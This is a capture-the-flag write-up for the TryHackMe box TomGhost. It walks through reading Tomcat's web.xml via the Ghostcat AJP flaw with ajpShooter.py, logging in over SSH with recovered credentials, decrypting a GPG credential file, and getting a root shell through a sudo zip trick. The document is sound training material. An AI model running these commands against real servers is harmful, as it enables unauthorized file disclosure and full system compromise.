TomGhost (TryHackMe) Writeup

Overview -
Machine: TomGhost
Platform: TryHackMe
Difficulty: Easy–Medium
Focus Areas: AJP Exploitation (Ghostcat), GPG Decryption, Privilege Escalation

Reference --

This writeup was completed with guidance from:

https://medium.com/@0xH1S/tomghost-writeup-tryhackme-56c78a7f1930

Step 1: Initial Enumeration
Start with an Nmap scan:

nmap -sC -sV <TARGET_IP>

Key Findings:
Port 22 (SSH) → Open

Port 8009 (AJP13) → Apache JServ Protocol

Port 8009 is interesting because it is vulnerable to Ghostcat (CVE-2020-1938).

Step 2: Exploiting Ghostcat (AJP)
We use the ajpShooter.py script to interact with the AJP service.

Important Note:
The script requires a full URL (not just IP).

Command:
python3 ajpShooter.py http://<TARGET_IP> 8009 /WEB-INF/web.xml read

Result:
The contents of web.xml are retrieved.

Step 3: Extract Credentials
From the exposed configuration files, credentials are identified.

Using SSH:

ssh skyfuck@<TARGET_IP>

Step 4: Enumerating User Directory
ls
Files Found:
credential.pgp

tryhackme.asc

Step 5: GPG Decryption
Import the key:

gpg --import tryhackme.asc
Decrypt the file:

gpg --decrypt credential.pgp
Output:
merlin:<password>

Step 6: Switch User
su merlin
Enter the decrypted password.

Step 7: Privilege Escalation

Check sudo permissions:

sudo -l
Look for binaries that can be exploited (commonly zip in this box).

Exploit:
sudo zip -T test.zip test -TT 'sh #'
This spawns a root shell.

 Final Result
 User access: skyfuck

 Credentials extracted via GPG

 Privilege escalation to root

 Key Takeaways :

1. Ghostcat (AJP) can expose sensitive files like web.xml

2. Always check for non-HTTP services during enumeration

3. GPG files in CTFs often contain credentials

4. Misconfigured sudo permissions are common privesc vectors

 Lessons Learned

1. Always verify script input format (URL vs IP)

2. Keep exploits organized to avoid confusion between challenges

3. Pay attention to output—even warnings may still contain useful data

Conclusion

This machine demonstrates a full attack chain:

Enumeration → AJP Exploitation → Credential Extraction → Privilege Escalation

A solid example of combining network exploitation + post-exploitation techniques.
